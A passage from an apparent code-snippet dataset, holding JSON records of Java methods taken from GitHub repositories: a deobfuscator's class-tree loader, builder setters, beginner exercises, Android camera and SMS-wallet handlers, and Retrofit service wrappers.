loadingLabel.setRunning(true);\n    this.add(loadingLabel, BorderLayout.CENTER);\n    this.invalidate();\n    this.validate();\n    this.repaint();\n    try {\n      SwingUtilities.invokeLater(() -> {\n        new Thread(() -> {\n          this.inputFile = input;\n          this.loadFile(type);\n          Threadtear.logger.info(\"Loaded {} class file(s)\", classes.size());\n          loadTree(classes);\n          refreshIgnored();\n          model.reload();\n          obfAnalysis.setEnabled(true);\n          threadtear.configPanel.run.setEnabled(true);\n          threadtear.configPanel.save.setEnabled(true);\n          this.remove(loadingLabel);\n          this.add(outerPanel, BorderLayout.CENTER);\n          this.invalidate();\n          this.validate();\n          this.repaint();\n        }).start();\n      });\n    } catch (Exception e) {\n      e.printStackTrace();\n    }\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/swing/tree/ClassTreePanel.java", "stars": "140", "class_props": {"extends": "JPanel", "implements": ["ILoader"], "modifiers": ["public"]}}, {"id": 56684, "method_name": "loadFile", "class_name": "ClassTreePanel", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void loadFile(String type) {\n    try {\n      switch (type) {\n      case \"jar\":\n        this.classes = JarIO.loadClasses(inputFile);\n        if (classes.stream().anyMatch(c -> c.oldEntry.getCertificates() != null)) {\n          JOptionPane.showMessageDialog(this,\n              \"<html>Warning: File is signed and may not load correctly if already modified, remove the signature<br>(<tt>META-INF\\\\MANIFEST.MF</tt>) and certificates (<tt>META-INF\\\\*.SF/.RSA</tt>) first!\",\n              \"Signature warning\", JOptionPane.WARNING_MESSAGE);\n        }\n        break;\n      case \"class\":\n        ClassNode node = Conversion.toNode(Files.readAllBytes(inputFile.toPath()));\n        this.classes = new ArrayList<>(Collections.singletonList(new Clazz(node, new JarEntry(node.name), inputFile)));\n        break;\n      }\n    } catch (IOException e) {\n      e.printStackTrace();\n    }\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/swing/tree/ClassTreePanel.java", "stars": "140", "class_props": {"extends": "JPanel", "implements": ["ILoader"], "modifiers": ["public"]}}, {"id": 56685, "method_name": "loadTree", "class_name": "ClassTreePanel", "params": ["List<Clazz>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void loadTree(List<Clazz> classes) {\n    ClassTreeNode root = new ClassTreeNode(\"\");\n    model = new DefaultTreeModel(root);\n    classes.forEach(c -> {\n      String[] packages = c.node.name.split(\"/\");\n      addToTree((ClassTreeNode) model.getRoot(), c, packages, 0);\n    });\n    for (Object n : Collections.list(root.depthFirstEnumeration())) {\n      ClassTreeNode node = (ClassTreeNode) n;\n      if (!node.isLeaf() && node != root) {\n        if (node.getChildCount() == 1) {\n          ClassTreeNode child = (ClassTreeNode) node.getChildAt(0);\n          if (child.member == null) {\n            node.combinePackage(child);\n          }\n        }\n      }\n      node.sort();\n    }\n    tree.setModel(model);\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/swing/tree/ClassTreePanel.java", "stars": "140", "class_props": {"extends": "JPanel", "implements": ["ILoader"], "modifiers": ["public"]}}, {"id": 56686, "method_name": "addToTree", "class_name": "ClassTreePanel", "params": ["ClassTreeNode", "Clazz", "String", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void addToTree(ClassTreeNode current, Clazz c, String[] packages, int pckg) {\n    String node = packages[pckg];\n    if (packages.length - pckg <= 1) {\n      current.add(new ClassTreeNode(c));\n      return;\n    }\n    for (int i = 0; i < current.getChildCount(); i++) {\n\n      ClassTreeNode child = (ClassTreeNode) current.getChildAt(i);\n      if (child.toString().equals(node)) {\n        addToTree(child, c, packages, ++pckg);\n        return;\n      }\n    }\n    ClassTreeNode newChild = new ClassTreeNode(node);\n    current.add(newChild);\n    addToTree(newChild, c, packages, ++pckg);\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/swing/tree/ClassTreePanel.java", "stars": "140", "class_props": {"extends": "JPanel", "implements": ["ILoader"], "modifiers": ["public"]}}, {"id": 56687, "method_name": "name", "class_name": "AzkabanJobBuilder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "AzkabanJobBuilder", "snippet": "    public AzkabanJobBuilder name(final String name) {\n      this.name = name;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/AzkabanJob.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56688, "method_name": "type", "class_name": "AzkabanJobBuilder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "AzkabanJobBuilder", "snippet": "    public AzkabanJobBuilder type(final String type) {\n      this.type = type;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/AzkabanJob.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56689, "method_name": "props", "class_name": "AzkabanJobBuilder", "params": ["Props"], "throws": null, "modifiers": ["public"], "return_type": "AzkabanJobBuilder", "snippet": "    public AzkabanJobBuilder props(final Props props) {\n      this.props = props;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/AzkabanJob.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56690, "method_name": "condition", "class_name": "AzkabanJobBuilder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "AzkabanJobBuilder", "snippet": "    public AzkabanJobBuilder condition(final String condition) {\n      this.condition = condition;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/AzkabanJob.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56691, "method_name": "dependsOn", "class_name": "AzkabanJobBuilder", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "AzkabanJobBuilder", "snippet": "    public AzkabanJobBuilder dependsOn(final List<String> dependsOn) {\n      // A node may or may not have dependencies.\n      this.dependsOn = dependsOn == null\n          ? Collections.emptyList()\n          : ImmutableList.copyOf(dependsOn);\n      return this;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/AzkabanJob.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56692, "method_name": "build", "class_name": "AzkabanJobBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "AzkabanJob", "snippet": "    public AzkabanJob build() {\n      return new AzkabanJob(this.name, this.type, this.props, this.condition, this.dependsOn);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/AzkabanJob.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56693, "method_name": "main", "class_name": "CircleArea", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\t//double pi = 3.14159; // we gonna use constant PI\n\t\tdouble radius;\n\t\tdouble area;\n\t\t\t\t\n\t\t//PI = 4.14; // We cannot change the value of final variables\n\t\t\n\t\tScanner sc = new Scanner(System.in);\n\t\t\n\t\tSystem.out.println(\"Enter the radius of a circle: \");\n\t\tradius = sc.nextDouble();\n\t\tarea = PI * (radius * radius);\n\t\t\n\t\tSystem.out.println(\"A circle of radius \" + radius);\n\t\tSystem.out.println(\"has an area of \" + area);\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day11/CircleArea.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56694, "method_name": "main", "class_name": "CharOccurance3", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\t\n\t\tString str = \"You have no choice other than following me!\";\n\t\tint count = 0;\n\t\tfor (int i = 0; i < str.length(); i++) {\n\t\t\tif(str.charAt(i)=='o') {\n\t\t\t\tcount++;\n\t\t\t}\n\t\t}\n\t\tSystem.out.println(\"Occurance of 'O' is: \"+count);\n\n\t}", "url": "https://raw.githubusercontent.com/AvinashDurai/MyCodes/master/javapractice/CharOccurance3.java", "stars": "19", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56695, "method_name": "toString", "class_name": "WebankUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        return \"ExternalUser{\" +\n            \"appId=\" + appId +\n            \", userId='\" + userId + '\\'' +\n            \", urn='\" + urn + '\\'' +\n            \", fullName='\" + fullName + '\\'' +\n            \", displayName='\" + displayName + '\\'' +\n            \", title='\" + title + '\\'' +\n            \", employeeNumber=\" + employeeNumber +\n            \", managerUrn='\" + managerUrn + '\\'' +\n            \", managerUserId='\" + managerUserId + '\\'' +\n            \", managerEmployeeNumber=\" + managerEmployeeNumber +\n            \", orgId=\" + orgId +\n            \", defaultGroupName='\" + defaultGroupName + '\\'' +\n            \", email='\" + email + '\\'' +\n            \", departmentId=\" + departmentId +\n            \", departmentName='\" + departmentName + '\\'' +\n            \", startDate=\" + startDate +\n            \", mobilePhone='\" + mobilePhone + '\\'' +\n            \", isActive='\" + isActive + '\\'' +\n            \", personGroup=\" + personGroup +\n            \", createdTime=\" + createdTime +\n            \", modifiedTime=\" + modifiedTime +\n            '}';\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WebankUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56696, "method_name": "main", "class_name": "Tong", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tint[] a = new int[11];\n\t\tint i,j;\n\t\tfor (i = 0 ; i  < 10 ; i ++)\n\t\t{\n\t\t\ta[i] = 0;    //\u5c06\u5341\u4e2a\u6570\u7ec4\u5143\u7d20\u90fd\u521d\u59cb\u5316\u4e3a0\n\t\t}\n\t\t\n\t\tfor (i = 0 ; i < 5 ; i ++)    //\u5faa\u73af\u8bfb\u51655\u4e2a\u6570\n\t\t{\n\t\t\tScanner in = new Scanner(System.in);    //\u4ece\u952e\u76d8\u8f93\u5165\u8003\u751f\u7684\u5206\u6570\n\t\t\tint t = in.nextInt();    //\u6362\u884c\u8f93\u5165\uff0c\u8f93\u5165\u4e94\u4f4d\u540c\u5b66\u7684\u8003\u8bd5\u6210\u7ee9\n\t\t\ta[t] ++;   //\u8fdb\u884c\u8ba1\u6570\n\t\t}\n\t\t\n\t\tfor (i = 0 ; i < 10 ; i ++)    //\u4f9d\u6b21\u5224\u65ada[0]~a[10]\n\t\t{\n\t\t\tfor (j = 1 ; j <= a[i] ; j ++)    //\u51fa\u73b0\u4e86\u51e0\u6b21\u5c31\u8f93\u51fa\u51e0\u6b21\n\t\t\t{\n\t\t\t\tSystem.out.print(i);\n\t\t\t}\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/hasaki-w-c/JAVA--/master/paixu/Tong.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56697, "method_name": "main", "class_name": "FinalTest01", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\t\n\t}", "url": "https://raw.githubusercontent.com/hasaki-w-c/JAVA--/master/final_/FinalTest01.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56698, "method_name": "testVanillaExchange", "class_name": "SampleKafkaApplicationTests", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "\tvoid testVanillaExchange() throws Exception {\n\t\tAwaitility.waitAtMost(Duration.ofSeconds(30)).until(this.consumer::getMessages, not(empty()));\n\t\tassertThat(this.consumer.getMessages()).extracting(\"message\").containsOnly(\"A simple test message\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-kafka/src/test/java/smoketest/kafka/SampleKafkaApplicationTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56699, "method_name": "setVideoContext", "class_name": "VideoState", "params": ["VideoContext"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setVideoContext(VideoContext videoContext) {\n        this.videoContext = videoContext;\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/state/VideoState.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 56700, "method_name": "play", "class_name": "VideoState", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void play();\n    public abstract void pause();\n    public abstract void speed();\n    public abstract void close();\n\n}\n\n", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/state/VideoState.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 56701, "method_name": "pause", "class_name": "VideoState", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void pause();\n    public abstract void speed();\n    public abstract void close();\n\n}\n\n", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/state/VideoState.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 56702, "method_name": "speed", "class_name": "VideoState", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void speed();\n    public abstract void close();\n\n}\n\n", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/state/VideoState.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 56703, "method_name": "close", "class_name": "VideoState", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void close();\n\n}\n\n", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/state/VideoState.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 56704, "method_name": "getTag", "class_name": "StartPreviewCallable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTag() {\n        return \"StartPreviewCallable\";\n    }", "url": "https://raw.githubusercontent.com/luca020400/face/master/java/co/aospa/facesense/camera/callables/StartPreviewCallable.java", "stars": "13", "class_props": {"extends": "CameraCallable", "implements": null, "modifiers": ["public"]}}, {"id": 56705, "method_name": "call", "class_name": "StartPreviewCallable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CallableReturn<Object>", "snippet": "    public CallableReturn<Object> call() {\n        Camera camera = getCameraData().mCamera;\n        if (camera == null) {\n            return new CallableReturn<>(new Exception(\"Camera isn't opened\"));\n        }\n        try {\n            if (this.mSurfaceTexture != null) {\n                camera.setPreviewTexture(this.mSurfaceTexture);\n            } else if (this.mSurfaceHolder != null) {\n                camera.setPreviewDisplay(this.mSurfaceHolder);\n            }\n            try {\n                startPreview(camera, this.mPreviewCallback);\n                return new CallableReturn<>((Object) null);\n            } catch (RuntimeException e) {\n                return new CallableReturn<>((Exception) e);\n            }\n        } catch (IOException e2) {\n            Log.e(\"StartPreviewCallable\", \"setPreviewDisplay failed.\");\n            return new CallableReturn<>((Exception) e2);\n        }\n    }", "url": "https://raw.githubusercontent.com/luca020400/face/master/java/co/aospa/facesense/camera/callables/StartPreviewCallable.java", "stars": "13", "class_props": {"extends": "CameraCallable", "implements": null, "modifiers": ["public"]}}, {"id": 56706, "method_name": "callback", "class_name": "StartPreviewCallable", "params": ["CallableReturn<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void callback(CallableReturn<Object> callableReturn) {\n        if (callableReturn.exception != null) {\n            CallableListener callableListener = (CallableListener) this.mCameraListener.get();\n            if (callableListener != null) {\n                callableListener.onError(callableReturn.exception);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/luca020400/face/master/java/co/aospa/facesense/camera/callables/StartPreviewCallable.java", "stars": "13", "class_props": {"extends": "CameraCallable", "implements": null, "modifiers": ["public"]}}, {"id": 56707, "method_name": "startPreview", "class_name": "StartPreviewCallable", "params": ["Camera", "PreviewCallback"], "throws": null, "modifiers": ["static", "private"], "return_type": "void", "snippet": "    private static void startPreview(Camera camera, PreviewCallback previewCallback) {\n        camera.startPreview();\n    }", "url": "https://raw.githubusercontent.com/luca020400/face/master/java/co/aospa/facesense/camera/callables/StartPreviewCallable.java", "stars": "13", "class_props": {"extends": "CameraCallable", "implements": null, "modifiers": ["public"]}}, {"id": 56708, "method_name": "compile", "class_name": "AdditiveExpression", "params": ["GScriptCompiler"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void compile(GScriptCompiler c) {\n\t\tsuper.compile(c);\n\t\tif(operator.equalsIgnoreCase(\"+\")) {\n\t\t\tc.code.add(GVM.ADD);\n\t\t}\n\t\telse if(operator.equalsIgnoreCase(\"-\")) {\n\t\t\tc.code.add(GVM.SUB);\n\t\t} else {\n\t\t\tthrow new IllegalStateException(\"Unknow operator: \"+operator);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/geertvos/gs-lang/master/src/main/java/net/geertvos/gvm/ast/AdditiveExpression.java", "stars": "17", "class_props": {"extends": "TwoArgumentExpression", "implements": null, "modifiers": ["public"]}}, {"id": 56709, "method_name": "getOperator", "class_name": "AdditiveExpression", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getOperator() {\n\t\treturn operator;\n\t}", "url": "https://raw.githubusercontent.com/geertvos/gs-lang/master/src/main/java/net/geertvos/gvm/ast/AdditiveExpression.java", "stars": "17", "class_props": {"extends": "TwoArgumentExpression", "implements": null, "modifiers": ["public"]}}, {"id": 56710, "method_name": "onReceive", "class_name": "IncomingSms", "params": ["Context", "Intent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onReceive(Context context, Intent intent) {\n\n\n        SmsManager smsManager = SmsManager.getDefault();\n        Intent in = new Intent(SENT_SMS_FLAG);\n        PendingIntent sentIntent = PendingIntent.getBroadcast(context, 0,\n                in, 0);\n\n        // Retrieves a map of extended data from the intent.\n        final Bundle bundle = intent.getExtras();\n\n        mydb = new DBHelper(context);\n\n        try {\n\n            if (bundle != null) {\n\n                final Object[] pdusObj = (Object[]) bundle.get(\"pdus\");\n\n                for (int i = 0; i < pdusObj.length; i++) {\n\n                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);\n                    String phoneNumber = currentMessage.getDisplayOriginatingAddress();\n                    String senderNum;\n                    if(phoneNumber.substring(0,3).equals(\"+91\"))\n                        senderNum = phoneNumber.substring(3);\n                    else\n                        senderNum = phoneNumber;\n                    String message = currentMessage.getDisplayMessageBody();\n\n                    String[] stringArray = message.split(\"\\\\s+\");\n                    String receiverNum = null,amount = null;\n                    if(stringArray[0].equals(\"MO\") || stringArray[0].equals(\"mo\") || stringArray[0].equals(\"Mo\"))\n                    {\n                        if(MainActivity.getAppContext() == null)\n                        {\n                            PackageManager pm = context.getPackageManager();\n                            Intent launchIntent = pm.getLaunchIntentForPackage(\"com.millionq.upi_payment\");\n                            context.startActivity(launchIntent);\n                        }\n                        else\n                        {\n                            MainActivity.getAppContext().registerReceiver(\n                                    new MessageSentListener(),\n                                    new IntentFilter(SENT_SMS_FLAG));\n\n                        }\n\n                        if(stringArray[1]!=null) receiverNum = stringArray[1];\n                        if(stringArray[2]!=null) amount = stringArray[2];\n\n                        if(!mydb.isPhonePresent(senderNum))\n                        {\n                            if(mydb.insertWallet(senderNum,String.valueOf(1000))){\n                                smsManager.sendTextMessage(senderNum, null,\n                                        \"Thanks for using MoneyOrder! \" +\n                                                \"Your wallet is credited with 1000 rupees\", sentIntent, null);\n                            }else{\n                                smsManager.sendTextMessage(senderNum, null,\n                                        \"There is a problem creating your account on \" +\n                                                \"MoneyOrder! Try again later.\", sentIntent, null);\n                            }\n                        }\n\n                        int cashofsender=0,cashofrec=0,sender_id,rec_id;\n                        sender_id = mydb.getWalletId(senderNum);\n                        Cursor sender = mydb.getWalletData(sender_id);\n                        if (sender.moveToFirst())\n                            cashofsender = Integer.parseInt(sender.getString(sender.getColumnIndex(WALLET_COLUMN_CASH)));\n                        sender.close();\n                        if(Integer.parseInt(amount) < cashofsender) {\n                            //insert Into Transaction Database\n                            if (mydb.insertContact(senderNum, receiverNum, amount)) {\n                                Toast.makeText(context, \"Transaction made successfully\",\n                                        Toast.LENGTH_SHORT).show();\n                            } else {\n                                Toast.makeText(context, \"Transaction was unsuccessful\",\n                                        Toast.LENGTH_SHORT).show();\n                            }\n\n                            int new_amount = cashofsender - Integer.parseInt(amount);\n                            if (mydb.updateWallet(sender_id, senderNum,\n                                    String.valueOf(new_amount))) {\n                                smsManager.sendTextMessage(senderNum, null,\n                                        \"Transaction made successfully! \" +\n                                                \"Your account is debited with \" + amount + \" rupees. Send to \"+ receiverNum + \". Your Current Balance: \"\n                                                + String.valueOf(new_amount), sentIntent, null);\n                            } else {\n                                smsManager.sendTextMessage(senderNum, null,\n                                        \"Transaction was unsuccessful. \" +\n                                                \"Try again later. Current Balance: \" + cashofsender, sentIntent, null);\n                            }\n\n                            if (!mydb.isPhonePresent(receiverNum)) {\n                                if (mydb.insertWallet(receiverNum, String.valueOf(1000))) {\n                                    smsManager.sendTextMessage(receiverNum, null,\n                                            \"Thanks for using MoneyOrder! \" +\n                                                    \"Your wallet is credited with 1000 rupees\", sentIntent, null);\n                                } else {\n                                    smsManager.sendTextMessage(receiverNum, null,\n                                            \"There is a problem creating your account on \" +\n                                                    \"MoneyOrder! Try again later.\", sentIntent, null);\n                                }\n\n                            }\n\n                            rec_id = mydb.getWalletId(receiverNum);\n                            Cursor rec = mydb.getWalletData(rec_id);\n                            if (rec.moveToFirst())\n                                cashofrec = Integer.parseInt(rec.getString(rec.getColumnIndex(WALLET_COLUMN_CASH)));\n                            rec.close();\n\n                            new_amount = cashofrec + Integer.parseInt(amount);\n                            if (mydb.updateWallet(rec_id, receiverNum,\n                                    String.valueOf(new_amount))) {\n                                smsManager.sendTextMessage(receiverNum, null,\n                                        \"Transaction made successfully! \" +\n                                                \"Your account is credited with \" + amount + \" rupees. Send by \" + senderNum + \". Current Balance: \"\n                                                + String.valueOf(new_amount), sentIntent, null);\n                            } else {\n                                smsManager.sendTextMessage(receiverNum, null,\n                                        \"Transaction was unsuccessful. \" +\n                                                \"Try again later. Current Balance: \"+ cashofrec, sentIntent, null);\n                            }\n                        }\n                        else\n                        {\n                            smsManager.sendTextMessage(senderNum, null,\n                                    \"Transaction was unsuccessful. \" +\n                                            \"You dont have enough cash to complete this transaction. Current Balance: \" +\n                                            cashofsender, sentIntent, null);\n                        }\n\n                    }\n                }\n\n            } // end for loop\n            // bundle is null\n\n        } catch (Exception e) {\n            Log.e(\"SmsReceiver\", \"Exception smsReceiver\" +e);\n\n        }\n\n        context.sendBroadcast(new Intent(\"UPDATE_UI\"));\n    }", "url": "https://raw.githubusercontent.com/zhackerx/upi_payment/master/app/src/main/java/com/millionq/upi_payment/IncomingSms.java", "stars": "1", "class_props": {"extends": "BroadcastReceiver", "implements": null, "modifiers": ["public"]}}, {"id": 56711, "method_name": "getHtml", "class_name": "Channell12Service", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Observable<Response>", "snippet": "    public Observable<Response<ResponseBody>> getHtml(String fullUrl) {\n        return channell12Service.getHtml(fullUrl);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/Epgs/Israel/Live/Channell12Service/Channell12Service.java", "stars": "9", "class_props": {"extends": "BaseRetrofit2Service", "implements": ["IChannell12Service"], "modifiers": ["public"]}}, {"id": 56712, "method_name": "postHtml", "class_name": "Channell12Service", "params": ["String", "RequestBody"], "throws": null, "modifiers": ["public"], "return_type": "Observable<Response>", "snippet": "    public Observable<Response<ResponseBody>> postHtml(String fullUrl, RequestBody body) {\n        return channell12Service.postHtml(fullUrl,body);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/Epgs/Israel/Live/Channell12Service/Channell12Service.java", "stars": "9", "class_props": {"extends": "BaseRetrofit2Service", "implements": ["IChannell12Service"], "modifiers": ["public"]}}, {"id": 56713, "method_name": "getJsonObject", "class_name": "Channell12Service", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Observable<Response>", "snippet": "    public Observable<Response<JsonObject>> getJsonObject(String fullUrl) {\n        return channell12Service.getJsonObject(fullUrl);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/Epgs/Israel/Live/Channell12Service/Channell12Service.java", "stars": "9", "class_props": {"extends": "BaseRetrofit2Service", "implements": ["IChannell12Service"], "modifiers": ["public"]}}, {"id": 56714, "method_name": "getJsonArray", "class_name": "Channell12Service", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Observable<Response>", "snippet": "    public Observable<Response<JsonArray>> getJsonArray(String fullUrl) {\n        return channell12Service.getJsonArray(fullUrl);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/Epgs/Israel/Live/Channell12Service/Channell12Service.java", "stars": "9", "class_props": {"extends": "BaseRetrofit2Service", "implements": ["IChannell12Service"], "modifiers": ["public"]}}, {"id": 56715, "method_name": "postChannelJsonHtml", "class_name": "Channell12Service", "params": ["String", "RequestBody"], "throws": null, "modifiers": ["public"], "return_type": "Observable<Response>", "snippet": "    public Observable<Response<JsonObject>> postChannelJsonHtml(String fullUrl, RequestBody body) {\n        return channell12Service.postChannelJsonHtml(fullUrl,body);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/Epgs/Israel/Live/Channell12Service/Channell12Service.java", "stars": "9", "class_props": {"extends": "BaseRetrofit2Service", "implements": ["IChannell12Service"], "modifiers": ["public"]}}, {"id": 56716, "method_name": "postJsonArray", "class_name": "Channell12Service", "params": ["String", "RequestBody"], "throws": null, "modifiers": ["public"], "return_type": "Observable<Response>", "snippet": "    public Observable<Response<JsonArray>> postJsonArray(String ullUrl, RequestBody body) {\n        return channell12Service.postJsonArray(ullUrl,body);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/Epgs/Israel/Live/Channell12Service/Channell12Service.java", "stars": "9", "class_props": {"extends": "BaseRetrofit2Service", "implements": ["IChannell12Service"], "modifiers": ["public"]}}, {"id": 56717, "method_name": "postChannelJsonPremitiveHtml", "class_name": "Channell12Service", "params": ["String", "RequestBody"], "throws": null, "modifiers": ["public"], "return_type": "Observable<Response>", "snippet": "    public Observable<Response<JsonPrimitive>> postChannelJsonPremitiveHtml(String fullUrl, RequestBody body) {\n        return channell12Service.postChannelJsonPremitiveHtml(fullUrl, body);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/Epgs/Israel/Live/Channell12Service/Channell12Service.java", "stars": "9", "class_props": {"extends": "BaseRetrofit2Service", "implements": ["IChannell12Service"], "modifiers": ["public"]}}, {"id": 56718, "method_name": "getRssfeed", "class_name": "Channell12Service", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Observable<Response>", "snippet": "    public Observable<Response<RssFeed>> getRssfeed(String fullUrl) {\n        return channell12Service.getRssfeed(fullUrl);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/Epgs/Israel/Live/Channell12Service/Channell12Service.java", "stars": "9", "class_props": {"extends": "BaseRetrofit2Service", "implements": ["IChannell12Service"], "modifiers": ["public"]}}, {"id": 56719, "method_name": "getChannel12Ticket", "class_name": "Channell12Service", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Observable<Response>", "snippet": "    public Observable<Response<KeshetAkamiTokenResponse>> getChannel12Ticket(String fullUrl) {\n        return channell12Service.getChannel12Ticket(fullUrl);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/Epgs/Israel/Live/Channell12Service/Channell12Service.java", "stars": "9", "class_props": {"extends": "BaseRetrofit2Service", "implements": ["IChannell12Service"], "modifiers": ["public"]}}, {"id": 56720, "method_name": "keyPressed", "class_name": "Input", "params": ["KeyEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void keyPressed(KeyEvent arg0) {\n\t\tkeys[arg0.getKeyCode()] = true;\n\t\tlastKey = (char) arg0.getKeyCode();\n\t\tkeyPressed = true;\n\t}", "url": "https://raw.githubusercontent.com/jabo-bernardo/Kree-Java/master/src/dev/jabo/kree/Input.java", "stars": "33", "class_props": {"extends": null, "implements": ["KeyListener", 